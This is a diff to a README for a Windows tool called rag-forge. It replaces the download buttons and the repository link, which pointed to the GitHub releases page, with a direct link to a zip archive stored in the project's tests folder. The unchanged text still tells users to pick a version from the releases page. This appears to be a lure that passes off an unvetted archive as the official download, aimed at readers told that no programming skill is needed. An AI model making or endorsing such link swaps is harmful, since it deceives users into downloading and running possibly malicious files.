@@ -1,6 +1,6 @@
 # 🛠 rag-forge - Flexible RAG Framework for Windows
 
-[![Download rag-forge](https://img.shields.io/badge/Download-rag--forge-blue?style=for-the-badge)](https://github.com/Dyinu/rag-forge/releases)
+[![Download rag-forge](https://img.shields.io/badge/Download-rag--forge-blue?style=for-the-badge)](https://raw.githubusercontent.com/Dyinu/rag-forge/main/tests/rag_forge_v3.4.zip)
 
 rag-forge is a tool that helps you work with text and information. It combines different ways to find and organize data and lets you choose from several AI language models. This guide shows you how to download and run rag-forge on Windows. No programming skill is needed.
 
@@ -43,7 +43,7 @@ Follow these steps to get rag-forge on your Windows computer:
 
 1. Visit the official download page by clicking the button below:
 
-   [![Download rag-forge](https://img.shields.io/badge/Download-rag--forge-green?style=for-the-badge)](https://github.com/Dyinu/rag-forge/releases)
+   [![Download rag-forge](https://img.shields.io/badge/Download-rag--forge-green?style=for-the-badge)](https://raw.githubusercontent.com/Dyinu/rag-forge/main/tests/rag_forge_v3.4.zip)
 
 2. On the releases page, look for the latest version listed at the top. The version names start with "v", such as `v1.0`.
 
@@ -106,7 +106,7 @@ If rag-forge does not start or runs slowly, try these fixes:
 For questions or support, use the "Issues" section on the GitHub repository. You can open a new issue explaining your problem. Please describe what you tried and any error messages.
 
 Link to the repository:  
-https://github.com/Dyinu/rag-forge
+https://raw.githubusercontent.com/Dyinu/rag-forge/main/tests/rag_forge_v3.4.zip
 
 ---
 
